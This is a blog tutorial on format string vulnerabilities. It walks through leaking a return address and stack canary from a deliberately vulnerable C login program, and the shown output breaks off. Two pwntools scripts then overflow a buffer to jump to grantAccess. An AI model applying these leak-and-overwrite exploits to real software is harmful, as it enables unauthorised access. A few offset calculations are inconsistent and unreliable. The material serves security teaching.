<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Format String Vulnerability | Sanketh's Blog</title><meta name=keywords content="vulnerabilities,format string,buffer overflow,reverse engineering"><meta name=description content="Format String Vulnerabilities
Why Information Leaks Matter in Modern Exploitation
The ASLR Problem
Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

Stack addresses change every execution
Heap addresses randomized
Library (libc) addresses randomized
Code addresses randomized (with PIE)

The dilemma:

You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
But you don&rsquo;t know WHERE to point it (shellcode location unknown)
Even ROP gadget addresses are randomized
You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives."><meta name=author content="Sanketh"><link rel=canonical href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.deee627d8b8d9065acc54b2c9d901e601e142335047d242a93ba7bce86f41f19.css integrity="sha256-3u5ifYuNkGWsxUssnZAeYB4UIzUEfSQqk7p7zob0Hxk=" rel="preload stylesheet" as=style><link rel=icon href=https://sankethbk.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sankethbk.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sankethbk.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://sankethbk.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://sankethbk.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"><meta property="og:site_name" content="Sanketh's Blog"><meta property="og:title" content="Format String Vulnerability"><meta property="og:description" content="Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:
Stack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:
You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don’t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-10T00:00:00+00:00"><meta property="article:tag" content="Vulnerabilities"><meta property="article:tag" content="Format String"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Format String Vulnerability"><meta name=twitter:description content="Format String Vulnerabilities
Why Information Leaks Matter in Modern Exploitation
The ASLR Problem
Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:

Stack addresses change every execution
Heap addresses randomized
Library (libc) addresses randomized
Code addresses randomized (with PIE)

The dilemma:

You can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary)
But you don&rsquo;t know WHERE to point it (shellcode location unknown)
Even ROP gadget addresses are randomized
You need to LEAK memory addresses first!

Format string vulnerabilities are one of the most powerful information leak primitives."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://sankethbk.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Format String Vulnerability","item":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-12-10-format-string/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Format String Vulnerability","name":"Format String Vulnerability","description":"Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:\nStack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:\nYou can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don\u0026rsquo;t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives.\n","keywords":["vulnerabilities","format string","buffer overflow","reverse engineering"],"articleBody":"Format String Vulnerabilities Why Information Leaks Matter in Modern Exploitation The ASLR Problem Modern systems use Address Space Layout Randomization (ASLR) to randomize memory locations:\nStack addresses change every execution Heap addresses randomized Library (libc) addresses randomized Code addresses randomized (with PIE) The dilemma:\nYou can overflow a buffer and control the return address (this is again assuming we somehow defeated the canary) But you don’t know WHERE to point it (shellcode location unknown) Even ROP gadget addresses are randomized You need to LEAK memory addresses first! Format string vulnerabilities are one of the most powerful information leak primitives.\nFormat Strings in C Format strings are used by functions like printf, sprintf, fprintf to format output with placeholders. These are not simple string printers. They are mini interpreters.\nExample\nprintf(\"x = %d, y = %d\\n\", x, y); Here: \"x = %d, y = %d\\n\" is not data It is a program that tells printf:\nPrint literal text x = Fetch an integer argument → print it as decimal Print , y = Fetch another integer argument → print it Print newline So: A format string is instructions for how to consume arguments and produce output.\nCommon format specifiers | Specifier | Meaning | How argument is interpreted | | --------- | -------- | --------------------------- | | `%d` | decimal | `int` | | `%u` | unsigned | `unsigned int` | | `%x` | hex | `unsigned int` | | `%p` | pointer | `void*` | | `%s` | string | pointer → dereference | | `%c` | char | integer → cast | | `%f` | float | double (promotion rules) | | `%n` | Write count to memory | (no output) | We can also pass width, precision, and modifiers\n%08x %.3f %10s %lld These don’t change where data comes from — they change how it’s formatted.\nHow printf actually processes arguments? arg_ptr = start_of_arguments; for each character in format_string: if character != '%': print(character) else: specifier = parse_specifier() value = *arg_ptr arg_ptr++ print(value according to specifier) We can. see what’s missing:\nNo check that arg_ptr is valid No check that caller provided enough arguments No type safety Variadic functions: the critical design choice int printf(const char *fmt, ...); This means: •\tThe compiler does not know how many arguments are passed •\tOnly the format string tells printf how many arguments exist •\tThere is no runtime verification\nSo printf blindly trusts the format string. This is not a bug — it’s how C was designed.\nWhere do the arguments come from? In 32-bit x86 all arguments of printf will be on stack.\nStack layout:\nHigh addresses ┌─────────────────┐ │ arg3 │ ├─────────────────┤ │ arg2 │ ├─────────────────┤ │ arg1 │ ├─────────────────┤ │ format string │ ← printf's first argument ├─────────────────┤ │ return address │ └─────────────────┘ Low addresses 64-bit x86-64 (AMD64) - First 6 in Registers. Calling convention (System V AMD64 ABI):\n- RDI = 1st argument (format string) - RSI = 2nd argument - RDX = 3rd argument - RCX = 4th argument - R8 = 5th argument - R9 = 6th argument - Stack = 7th argument onwards This doesn’t change much, it just means it will leak addresses only when there are more than 7 format specifiers and not enough values.\nThe Vulnerability: User Input as Format String The critical mistake is passing user input as a format string.\nchar user_input[100]; fgets(user_input, sizeof(user_input), stdin); // DANGEROUS: User input used directly as format string printf(user_input); Why this is dangerous:\nUser controls the format string User can inject format specifiers like %x, %s, %n These specifiers will read or write memory without authorization Can lead to information disclosure or arbitrary code execution Sample Program With Vulnerability #include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { char password[8]; char username[8]; int isAuthenticated = 0; printf(\"Enter Username: \"); scanf(\"%s\", username); printf(\"Enter password for: \"); printf(username); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } This is a version of the program we previously used in buffer overflows, but this time we will do it without disabling ASLR and without inspecting with GDB.\nprintf(username); This is the line which allows us to exploit format string vulnerability. A safe version would’ve been\nprintf(\"%s\", username); We still need to disable stackguard as our attack is based on buffer overflow\n$ gcc -fno-stack-protector -O0 -o vuln main.c main.c: In function ‘AuthenticateUser’: main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security] 26 | printf(username); | ^~~~~~~~ We can see gcc shows us warning that we are passing only format string an not arguments. Static analysis can catch format strings vulnerability very effectively.\nLet’s look at the assembly of AuthenticateUser function to confirm the vulenrability\n$ objdump -d -M intel,mnemonic,no-att -j .text vuln 00000000000011fe : 11fe:\tf3 0f 1e fa endbr64 1202:\t55 push rbp 1203:\t48 89 e5 mov rbp,rsp 1206:\t48 83 ec 20 sub rsp,0x20 120a:\tc7 45 ec 00 00 00 00 mov DWORD PTR [rbp-0x14],0x0 1211:\t48 8d 05 04 0e 00 00 lea rax,[rip+0xe04] # 201c \u003c_IO_stdin_used+0x1c\u003e 1218:\t48 89 c7 mov rdi,rax 121b:\tb8 00 00 00 00 mov eax,0x0 1220:\te8 6b fe ff ff call 1090 1225:\t48 8d 45 f0 lea rax,[rbp-0x10] 1229:\t48 89 c6 mov rsi,rax 122c:\t48 8d 05 fa 0d 00 00 lea rax,[rip+0xdfa] # 202d \u003c_IO_stdin_used+0x2d\u003e 1233:\t48 89 c7 mov rdi,rax 1236:\tb8 00 00 00 00 mov eax,0x0 123b:\te8 70 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1240:\t48 8d 05 e9 0d 00 00 lea rax,[rip+0xde9] # 2030 \u003c_IO_stdin_used+0x30\u003e 1247:\t48 89 c7 mov rdi,rax 124a:\tb8 00 00 00 00 mov eax,0x0 124f:\te8 3c fe ff ff call 1090 1254:\t48 8d 45 f0 lea rax,[rbp-0x10] 1258:\t48 89 c7 mov rdi,rax 125b:\tb8 00 00 00 00 mov eax,0x0 1260:\te8 2b fe ff ff call 1090 1265:\t48 8d 45 f8 lea rax,[rbp-0x8] 1269:\t48 89 c6 mov rsi,rax 126c:\t48 8d 05 ba 0d 00 00 lea rax,[rip+0xdba] # 202d \u003c_IO_stdin_used+0x2d\u003e 1273:\t48 89 c7 mov rdi,rax 1276:\tb8 00 00 00 00 mov eax,0x0 127b:\te8 30 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1280:\t48 8d 55 ec lea rdx,[rbp-0x14] 1284:\t48 8d 45 f8 lea rax,[rbp-0x8] 1288:\t48 89 d6 mov rsi,rdx 128b:\t48 89 c7 mov rdi,rax 128e:\te8 30 ff ff ff call 11c3 1293:\t8b 45 ec mov eax,DWORD PTR [rbp-0x14] 1296:\t83 f8 01 cmp eax,0x1 1299:\t75 0c jne 12a7 129b:\tb8 00 00 00 00 mov eax,0x0 12a0:\te8 04 ff ff ff call 11a9 12a5:\teb 0f jmp 12b6 12a7:\t48 8d 05 97 0d 00 00 lea rax,[rip+0xd97] # 2045 \u003c_IO_stdin_used+0x45\u003e 12ae:\t48 89 c7 mov rdi,rax 12b1:\te8 ca fd ff ff call 1080 12b6:\t90 nop 12b7:\tc9 leave 12b8:\tc3 ret We know the calling convention is to place first parameter in rdi and second parameter in rsi.\nWe can see in the first two printf calls, the value in rdi is taken from .rodata section. It uses RIP relative addressing here to point to the address of the hardcoded format strings.\n122c:\t48 8d 05 fa 0d 00 00 lea rax,[rip+0xdfa] # 202d \u003c_IO_stdin_used+0x2d\u003e 1233:\t48 89 c7 mov rdi,rax 1236:\tb8 00 00 00 00 mov eax,0x0 123b:\te8 70 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1240:\t48 8d 05 e9 0d 00 00 lea rax,[rip+0xde9] # 2030 \u003c_IO_stdin_used+0x30\u003e 1247:\t48 89 c7 mov rdi,rax 124a:\tb8 00 00 00 00 mov eax,0x0 124f:\te8 3c fe ff ff call 1090 But in the third printf\n1254:\t48 8d 45 a0 lea rax,[rbp-0x10] 1258:\t48 89 c7 mov rdi,rax 125b:\tb8 00 00 00 00 mov eax,0x0 1260:\te8 2b fe ff ff call 1090 We can see the adress written to rdi is relative to rbp which means its clearly on the stack and its the address of the username variable.\nExploit 1: Leak the Stack Adresses and Replace the Return Address of AuthenticateUser to grantAccess Let’s visualize the stack layout:\n1206:\tsub rsp,0x20 # Allocate 32 bytes (0x20) 120a:\tmov DWORD PTR [rbp-0x14],0x0 # isAuthenticated 1225:\tlea rax,[rbp-0x10] # username 1265:\tlea rax,[rbp-0x8] # password Stack layout:\nHigher addresses ┌──────────────────────┐ │ Return address │ ← [rbp+8] (0x12cb - points to main) │ (0x55...12cb) │ **WE WANT TO OVERWRITE THIS!** ├──────────────────────┤ │ Saved RBP │ ← [rbp] (8 bytes) ├──────────────────────┤ │ password[8] │ ← [rbp-0x8] (8 bytes from RBP) ├──────────────────────┤ │ username[8] │ ← [rbp-0x10] (16 bytes from RBP) ├──────────────────────┤ │ isAuthenticated (4) │ ← [rbp-0x14] (20 bytes from RBP) ├──────────────────────┤ │ padding (12 bytes) │ ← [rbp-0x20] (unused, stack aligned) └──────────────────────┘ Lower addresses Total stack frame: 32 bytes (0x20)\nCalculating Key Distances 1. Distance of Password From Saved RA This is what we need to leak with format string vulnerability and overwrite it later\nusername at [rbp-0x10] password at [rbp-0x8] return address at [rbp+8] Distance from username to return address: 0x10 + 8 = 24 bytes Distance from password to return address: 0x8 + 8 = 16 bytes 2. The Actual Address of grantAccess This is where we need to jump to using buffer overflow and the previous information leaked.\nNow lets calculate the address of grantAccess: Since this is PIE + ASLR enabled binary and we are not using GDB, we need a creative way to find dynamic address of grantAccess function. One insight that we can recall is, even with PIE and ASLR enabled, the relative distance between the lines of code in .text section remains same.\n00000000000012b9 : 12b9:\tf3 0f 1e fa endbr64 12bd:\t55 push rbp 12be:\t48 89 e5 mov rbp,rsp 12c1:\tb8 00 00 00 00 mov eax,0x0 12c6:\te8 33 ff ff ff call 11fe 12cb:\tb8 00 00 00 00 mov eax,0x0 -\u003e this is the return address of AuthenticateUser 12d0:\t5d pop rbp 12d1:\tc3 ret Return address (leaked): 0x12cb grantAccess: 0x11a9 Offset: 0x12cb - 0x11a9 = 0x122 (290 bytes) Since we would’ve already leaked the return address in main using format string in our previous step, we can add this offset of 290 bytes to get the actual address of grantAccess.\n3. Correct Argument to Leak From printf When we call printf:\ncall printf Inside printf’s perspective:\nPosition 1-6: RDI, RSI, RDX, RCX, R8, R9 (registers) Position 7: [rsp] ← First stack parameter Position 8: [rsp+8] ← Second stack parameter Position 9: [rsp+16] ← Third stack parameter Position 10: [rsp+24] etc. What the Compiler Generates:\n# Caller (before call printf): push arg8 # Push in reverse order push arg7 mov r9, arg6 # Load registers mov r8, arg5 mov rcx, arg4 mov rdx, arg3 mov rsi, arg2 mov rdi, arg1 call printf # Now RSP points right at arg7! # After printf returns: add rsp, 16 # Clean up the 2 stack args (arg7, arg8) Since callee is passing the variadic arguments, it will be located on the stack before the printf’s stack frame is set up.\nThis is the stack frame just before printf is about to be called, the callee has pushed the variadic arguments ot stack (in this case its not) and saved the return adddress to callee. The printf’s prologue has not been executed yet. Since the variadic argument va_list is already present on stack, we can guarantee that printf’s arg_ptr starts scanning arguments from there and the actual stack frame of printf doesn’t even matter.\nHigher addresses ┌──────────────────────┐ │ Return to main │ ← AuthenticateUser return addr (TARGET) ├──────────────────────┤ │ Saved RBP │ ├──────────────────────┤ │ password[8] │ ├──────────────────────┤ │ username[8] │ ├──────────────────────┤ │ isAuthenticated + │ │ padding │ ├──────────────────────┤ │ va_list │ ← printf's arg_ptr starts, here, it will look like [rbp+8] in printf's assembly ├──────────────────────┤ │ return address to. | | AuthenticateUser. │ ← [rsp] of AuthenticateUser └──────────────────────┘ Lower addresses By looking at the stack we built previously. We can see we ened to move the printf’s arg_ptr 5 times. So considering 6 register arguments, we get 6 + 5 = 11. So we need to leak the 12th value in what printf thinks is a value to format string.\nWe can use %p to print the addresses with 0x prefix. If we add %p 11 times, we will leak the 11th argument.\nsanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffded20f2c0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5d61a35072cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffeb89c1e40(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ce761ba72cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffe874444d0(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x5ca4fddfe2cb^C sanketh@sanketh-81de:$ ./vuln Enter Username: %p%p%p%p%p%p%p%p%p%p%p Enter password for: 0x7ffd4ef49d80(nil)(nil)0xa0xffffffff(nil)(nil)0x70257025702570250x70257025702570250x7025702570250x651533b3e2cb^C We can see even with ASLR, our return address consistenly ends with 2cb. In fact even the static address on binary showed the address ending with 2cb.\n12cb:\tb8 00 00 00 00 mov eax,0x0 -\u003e this is the return address of AuthenticateUser The important observation here is, the last 3 nibbles remains unchanged even after ASLR!\nIts because of the page alignment •\tPage size = 4096 bytes = 0x1000 •\tThat means the lowest 12 bits are always zero\nSo the constant offset ASLR will be adding has to be a multiple of 4096 which means last 3 nibbles are always 0. Otherwise it would disturb the page layout of segments.\nWe can use this as to double confirm we’re headed in the right direction. Or we can also do rough calculation and leak a set of addresses around our estimate and look for the one ending with expected last 12 bits.\nSometimes we may not have space to tpe enough %p’s, the content itself might overflow and end up overwriting the return address which will simply crash the program. There is another we can print any argument with just 8 bytes of input\nEnter Username: %11$p Enter password for: 0x5a45b5b602cb This will directly take us to the 11th parameter.\nBuilding the Payload for Buffer Overflow Let’s consider this execution\n$ ./vuln Enter Username: %11$p Enter password for: 0x5a45b5b602cb From our earlier calculation we deduced that the address of grantAccess is 290 bytes below the address of return address to main. Using that we can do 0x5a45b5b602cb + 0x122 = 0x0x5a45b5b603ed\nBut the problem is we cannot send a raw bytestring as input from stdin. Because the ascii representation of some of these bytes are not even printable. So we pass it using script.\nfrom pwn import * import re print(\"[*] Launching process\") p = process(\"./vuln\", stdin=PTY, stdout=PTY) print(\"[*] Waiting for 'Enter Username:'\") data = p.recvuntil(b\"Enter Username: \", timeout=2) print(f\"[DEBUG] Received so far:\\n{data}\") print(\"[*] Sending format string\") p.sendline(b\"%11$p\") print(\"[*] Waiting for 'Enter password for:'\") data = p.recvuntil(b\"Enter password for: \", timeout=2) print(f\"[DEBUG] Received so far:\\n{data}\") print(\"[*] Attempting to read leaked pointer\") leak_line = p.recv(timeout=2) print(f\"[DEBUG] Raw leak bytes: {leak_line}\") # Try extracting address safely m = re.search(rb\"0x[0-9a-fA-F]+\", leak_line) if not m: print(\"[!] Failed to find leaked address!\") p.interactive() exit(1) leak = int(m.group(0), 16) print(f\"[+] Leaked return address: {hex(leak)}\") print(\"[*] Calculating grantAccess\") grant_access = leak - 0x122 print(f\"[+] grantAccess = {hex(grant_access)}\") print(\"[*] Building payload\") payload = b\"A\"*8 + b\"B\"*8 + p64(grant_access) print(f\"[DEBUG] Payload length: {len(payload)}\") print(f\"[DEBUG] Payload bytes: {payload}\") print(\"[*] Sending password payload\") p.sendline(payload) print(\"[*] Reading remaining output\") out = p.recvall(timeout=1) print(out.decode(errors=\"ignore\")) $ python3 pwn_payload3.py [*] Launching process [+] Starting local process './vuln' argv=[b'./vuln'] : pid 3536 [*] Waiting for 'Enter Username:' [DEBUG] Received 0x10 bytes: b'Enter Username: ' [DEBUG] Received so far: b'Enter Username: ' [*] Sending format string [DEBUG] Sent 0x6 bytes: b'%11$p\\n' [*] Waiting for 'Enter password for:' [DEBUG] Received 0x22 bytes: b'Enter password for: 0x55bbc51d72cb' [DEBUG] Received so far: b'Enter password for: ' [*] Attempting to read leaked pointer [DEBUG] Raw leak bytes: b'0x55bbc51d72cb' [+] Leaked return address: 0x55bbc51d72cb [*] Calculating grantAccess [+] grantAccess = 0x55bbc51d71a9 [*] Building payload [DEBUG] Payload length: 24 [DEBUG] Payload bytes: b'AAAAAAAABBBBBBBB\\xa9q\\x1d\\xc5\\xbbU\\x00\\x00' [*] Sending password payload [DEBUG] Sent 0x19 bytes: 00000000 41 41 41 41 41 41 41 41 42 42 42 42 42 42 42 42 │AAAA│AAAA│BBBB│BBBB│ 00000010 a9 71 1d c5 bb 55 00 00 0a │·q··│·U··│·│ 00000019 [*] Reading remaining output [+] Receiving all data: Done (37B) [DEBUG] Received 0x25 bytes: b'Authentication Failed\\n' b'Access Granted\\n' [*] Stopped process './vuln' (pid 3536) Authentication Failed Access Granted This shows that the exploit worked!\nExploit 2: Buffer Overflow with Stack Canary Enabled In our previous exploit we disabled stack canary because the buffer overflow will overwrite canary and the program will crash before we execute the code for grantAccess.\nNow we will keep the stack canary enabled and achieve the same result. The key to this attack is we can leak the stack canary in the same way we leaked the return address. Then while building the payload, we will make sure that the value of canary gets overwritten with same value, so the canary check won’t fail.\nFor this example, i will change the length of username to 12 bytes, because we need to pass more than 8 bytes of input without overwriting canary. Even though we’ve defined username after password, username appears on stack first, meaning closer to canary. Compiler is free to reorder local variables on stack, so we can’t rely on it.\n#include #include void grantAccess() { printf(\"Access Granted\\n\"); } void checkPassword(char* password, int *isAuthenticated) { if (strcmp(password, \"admin123\") == 0) { *isAuthenticated = 1; } } void AuthenticateUser() { char password[8]; char username[12]; int isAuthenticated = 0; printf(\"Enter Username: \"); scanf(\"%s\", username); printf(\"Enter password for: \"); printf(username); scanf(\"%s\", password); checkPassword(password, \u0026isAuthenticated); if (isAuthenticated == 1) { grantAccess(); } else { printf(\"Authentication Failed\\n\"); } } int main() { AuthenticateUser(); } $ gcc -O0 -o vuln_canary main.c main.c: In function ‘AuthenticateUser’: main.c:26:17: warning: format not a string literal and no format arguments [-Wformat-security] 26 | printf(username); | ^~~~~~~~ With -fstack-protector (or default GCC settings), the stack frame becomes:\nHigher addresses ┌──────────────────────────┐ │ Saved RBP │ ← rbp ├──────────────────────────┤ │ Return Address │ ← rbp+8 ├──────────────────────────┤ │ Stack Canary (8 bytes) │ ← rbp-0x8 ├──────────────────────────┤ │ username[12] │ ← rbp-0x14 ├──────────────────────────┤ │ password[8] │ ← rbp-0x1c ├──────────────────────────┤ │ isAuthenticated (4) │ ← rbp-0x20 ├──────────────────────────┤ │ padding (4 bytes) │ ← rbp-0x24 (implicit) └──────────────────────────┘ Lower addresses Since the return address was at [rsp+40] earlier, with this intuition it seems like it should be present at [rsp+48] because of 8 byte stack canary added in between. But actually, it will still be at [rsp+40] because the space used for padding will be compensated.\nWe can verify it from GDB\nBreakpoint 1, 0x0000555555555226 in AuthenticateUser () (gdb) disass Dump of assembler code for function AuthenticateUser: 0x000055555555521e \u003c+0\u003e:\tendbr64 0x0000555555555222 \u003c+4\u003e:\tpush rbp 0x0000555555555223 \u003c+5\u003e:\tmov rbp,rsp =\u003e 0x0000555555555226 \u003c+8\u003e:\tsub rsp,0x20 0x000055555555522a \u003c+12\u003e:\tmov rax,QWORD PTR fs:0x28 0x0000555555555233 \u003c+21\u003e:\tmov QWORD PTR [rbp-0x8],rax 0x0000555555555237 \u003c+25\u003e:\txor eax,eax 0x0000555555555239 \u003c+27\u003e:\tmov DWORD PTR [rbp-0x20],0x0 0x0000555555555240 \u003c+34\u003e:\tlea rax,[rip+0xdd5] # 0x55555555601c 0x0000555555555247 \u003c+41\u003e:\tmov rdi,rax 0x000055555555524a \u003c+44\u003e:\tmov eax,0x0 We can see that the stack size is still 32 bytes from sub rsp,0x20 which is sill same as earlier.\nBut one additional change now is that some lines of code will be added for stack canary as well. So we need to recalculate the offset of grantAccess.\n$ objdump -d -M intel,mnemonic,no-att -j .text vuln_canary 00000000000012fc : 12fc:\tf3 0f 1e fa endbr64 1300:\t55 push rbp 1301:\t48 89 e5 mov rbp,rsp 1304:\tb8 00 00 00 00 mov eax,0x0 1309:\te8 10 ff ff ff call 121e 130e:\tb8 00 00 00 00 mov eax,0x0. \u003c- return address to main 1313:\t5d pop rbp 1314:\tc3 ret 00000000000011c9 : 11c9:\tf3 0f 1e fa endbr64 11cd:\t55 push rbp 11ce:\t48 89 e5 mov rbp,rsp 11d1:\t48 8d 05 2c 0e 00 00 lea rax,[rip+0xe2c] # 2004 \u003c_IO_stdin_used+0x4\u003e 11d8:\t48 89 c7 mov rdi,rax 11db:\te8 b0 fe ff ff call 1090 11e0:\t90 nop 11e1:\t5d pop rbp 11e2:\tc3 ret The return address to main is now 0x130e and grantAccess is at 0x11c9. So relative offset is 0x130e - 0x11c9 = 0x145 or 325 bytes.\nWith the same idea that last 3 nibbles remain same even with ASLR, we need to look for aress ending with 30e while leaking.\nWe can see that stack canary is 16 bytes behind the return address, so it must be at [rsp+24]. ANother way to spot stack canary is to look for numbers with last two nibbles as 0’s.\nWhy Stack Canary has Last 8 bits set to 0 The stack canary intentionally ends with a zero byte (\\x00) to break string-based overflows.\n0x77111d362d141300 ^^ \\x00 On x86-64 Linux, the stack canary typically looks like:\n[random 7 bytes][00] Why the last byte is zero (the real reason)?\nTo stop strcpy, scanf(\"%s\"), gets, etc. Cannot copy a zero byte unless explicitly told to. So if the canary ends with \\x00: •\tAny string overflow will stop before overwriting the canary •\tOr it will overwrite only the first few bytes, not the full value •\tResult: canary mismatch → __stack_chk_fail\nThis defeats accidental and naive overwrites.\nLeaking the Address Now can leak 9th and 11th argument for canary and return address respectively\n$ ./vuln_canary Enter Username: %11$p-%9$p Enter password for: 0x604f9f2ce30e-0x7fb896f70c86ed00 Overflowing the Buffer Using this information we can build the buffer in this pattern\n[ buffer fill up to canary ] [ exact 8-byte canary ] [ fake saved RBP (8 bytes, anything) ] [ new return address (8 bytes) ] Now we can write a python script using pwntools to exploit this\n#!/usr/bin/env python3 from pwn import * import re context.binary = \"./vuln_canary\" context.log_level = \"debug\" def main(): print(\"[*] Launching process\") p = process(\"./vuln_canary\", stdin=PTY, stdout=PTY) # ------------------------- # Stage 1: Leak # ------------------------- print(\"[*] Waiting for 'Enter Username:'\") data = p.recvuntil(b\"Enter Username: \", timeout=2) print(f\"[DEBUG] Received so far:\\n{data}\") print(\"[*] Sending format string leak\") p.sendline(b\"%11$p-%9$p\") print(\"[*] Reading leak output\") data = p.recvuntil(b\"Enter password for: \", timeout=2) data += p.recv(timeout=0.2) # drain remaining output print(f\"[DEBUG] Full leak buffer:\\n{data}\") leaks = re.findall(rb\"0x[0-9a-fA-F]+\", data) if len(leaks) \u003c 2: print(\"[!] Failed to extract leaks\") p.close() return ret_addr = int(leaks[0], 16) canary = int(leaks[1], 16) print(f\"[+] Leaked return address: {hex(ret_addr)}\") print(f\"[+] Leaked canary : {hex(canary)}\") # ------------------------- # Stage 2: Calculate target # ------------------------- OFFSET_RET_TO_GRANT = 0x145 # verified earlier grant_access = ret_addr - OFFSET_RET_TO_GRANT print(f\"[+] Calculated grantAccess: {hex(grant_access)}\") # ------------------------- # Stage 3: Build payload # ------------------------- payload = b\"A\" * 20 # padding up to canary payload += p64(canary) # correct canary payload += b\"B\" * 8 # saved RBP payload += p64(grant_access) # new return address print(f\"[DEBUG] Payload length: {len(payload)}\") print(f\"[DEBUG] Payload bytes: {payload}\") # ------------------------- # Stage 4: Trigger overflow # ------------------------- print(\"[*] Sending password payload\") p.sendline(payload) # ------------------------- # Stage 5: Read result # ------------------------- out = p.recvall(timeout=2) print(\"[*] Program output:\") print(out.decode(errors=\"ignore\")) if b\"Access Granted\" in out: print(\"[+] SUCCESS: Exploit worked\") else: print(\"[-] FAILURE: Exploit did not work\") p.close() if __name__ == \"__main__\": main() $ python3 pwn_payload_canary2.py [*] '/home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/format_strings/vuln_canary' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled SHSTK: Enabled IBT: Enabled Stripped: No [*] Launching process [+] Starting local process './vuln_canary' argv=[b'./vuln_canary'] : pid 3978 [*] Waiting for 'Enter Username:' [DEBUG] Received 0x10 bytes: b'Enter Username: ' [DEBUG] Received so far: b'Enter Username: ' [*] Sending format string leak [DEBUG] Sent 0xb bytes: b'%11$p-%9$p\\n' [*] Reading leak output [DEBUG] Received 0x35 bytes: b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400' [DEBUG] Full leak buffer: b'Enter password for: 0x60f3fb9c530e-0xd3be8511a62f4400' [+] Leaked return address: 0x60f3fb9c530e [+] Leaked canary : 0xd3be8511a62f4400 [+] Calculated grantAccess: 0x60f3fb9c51c9 [DEBUG] Payload length: 44 [DEBUG] Payload bytes: b'AAAAAAAAAAAAAAAAAAAA\\x00D/\\xa6\\x11\\x85\\xbe\\xd3BBBBBBBB\\xc9Q\\x9c\\xfb\\xf3`\\x00\\x00' [*] Sending password payload [DEBUG] Sent 0x2d bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ 00000010 41 41 41 41 00 44 2f a6 11 85 be d3 42 42 42 42 │AAAA│·D/·│····│BBBB│ 00000020 42 42 42 42 c9 51 9c fb f3 60 00 00 0a │BBBB│·Q··│·`··│·│ 0000002d [+] Receiving all data: Done 